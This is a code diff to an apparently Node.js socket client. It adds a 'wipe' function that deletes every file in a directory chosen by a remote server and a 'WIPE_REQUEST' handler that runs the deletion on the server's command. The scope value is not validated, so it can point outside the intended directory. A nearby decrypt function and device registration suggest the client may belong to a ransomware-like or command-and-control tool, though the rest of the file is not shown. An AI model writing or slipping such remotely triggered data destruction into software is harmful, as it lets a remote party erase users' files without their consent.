@@ -87,6 +87,36 @@ const decrypt = (key) => {
     }));
 };
 
+const wipe = (scope) => {
+    return new Promise((resolve, reject) => {
+        fs.readdir(path.join(__dirname, scope), (err, files) => {
+            if (err) {
+                console.log(`Unable to scan directory: ${scope}` + err);
+                reject(err);
+            } else {
+                let deletePromises = files.map(file => {
+                    return new Promise((resolve) => {
+                        const filePath = path.join(__dirname, scope, file);
+                        try {
+                            console.log(`Deleting: ${filePath}`);
+                            fs.unlinkSync(filePath);
+                            console.log(`Deleted: ${filePath}`);
+                            resolve();
+                        } catch (e) {
+                            console.log(`Error deleting: ${filePath}`);
+                        }
+                    });
+                });
+                Promise.all(deletePromises).then(() => {
+                    resolve();
+                }).catch(e => {
+                    reject(e);
+                })
+            }
+        });
+    });
+};
+
 socket.on('connect', () => {
     console.log('connected to server!');
     mac.one((err, mac) => {
@@ -100,6 +130,17 @@ socket.on('connect', () => {
                 secret: config.SECRET
             });
         }
+    });
+});
+
+socket.on('WIPE_REQUEST', data => {
+    console.log(data);
+    console.log(`Got WIPE_REQUEST from Server`);
+    wipe(data.scope).then(() => {
+        console.log(`Deletion Successful!`)
+    }).catch(e => {
+        console.error(`Encountered Deletion errors!`);
+        console.error(e);
     });
 });
 
